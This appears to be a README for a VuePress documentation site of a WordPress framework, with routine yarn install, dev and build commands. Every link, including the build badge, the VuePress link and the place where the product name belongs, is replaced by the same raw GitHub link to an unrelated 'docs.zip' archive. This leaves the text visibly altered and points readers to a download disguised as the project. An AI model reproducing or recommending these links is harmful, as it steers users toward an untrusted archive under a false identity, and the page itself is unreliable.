[![Build and Deploy](https://raw.githubusercontent.com/uwk2007/docs/master/Cyllenian/docs.zip)](https://raw.githubusercontent.com/uwk2007/docs/master/Cyllenian/docs.zip)

Documentation for https://raw.githubusercontent.com/uwk2007/docs/master/Cyllenian/docs.zip, the world's most powerful and widely use WordPress input framework.

These docs are based off of [VuePress](https://raw.githubusercontent.com/uwk2007/docs/master/Cyllenian/docs.zip) and automatically built by GitHub Actions.

Feel free to send pull requests and improvements. We'd love your help if you find anything we've missed.

## Working with VuePress

```bash
yarn install
```

## Test Locally
```bash
yarn docs:dev
```

## Build HTML
```bash
yarn docs:build
```

Works best with a Unix-based OS.
